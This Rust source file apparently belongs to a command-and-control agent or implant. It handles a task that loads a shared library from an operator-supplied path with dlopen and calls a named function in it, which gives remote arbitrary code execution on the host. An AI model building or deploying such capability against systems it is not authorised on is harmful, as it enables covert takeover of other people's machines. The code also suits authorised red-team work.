use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct ExecLibArgs {
    library_path: String,
    #[serde(default)]
    function_name: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: ExecLibArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Use dlopen via FFI
    unsafe {
        let path_cstr = std::ffi::CString::new(args.library_path.as_bytes()).unwrap();
        let handle = libc::dlopen(path_cstr.as_ptr(), libc::RTLD_NOW);
        if handle.is_null() {
            let err = std::ffi::CStr::from_ptr(libc::dlerror());
            response.set_error(&format!("dlopen failed: {}", err.to_string_lossy()));
        } else if !args.function_name.is_empty() {
            let func_cstr = std::ffi::CString::new(args.function_name.as_bytes()).unwrap();
            let sym = libc::dlsym(handle, func_cstr.as_ptr());
            if sym.is_null() {
                let err = std::ffi::CStr::from_ptr(libc::dlerror());
                response.set_error(&format!("dlsym failed: {}", err.to_string_lossy()));
            } else {
                let func: extern "C" fn() = std::mem::transmute(sym);
                func();
                response.user_output = format!("Executed {}::{}", args.library_path, args.function_name);
                response.completed = true;
            }
        } else {
            response.user_output = format!("Loaded library: {}", args.library_path);
            response.completed = true;
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
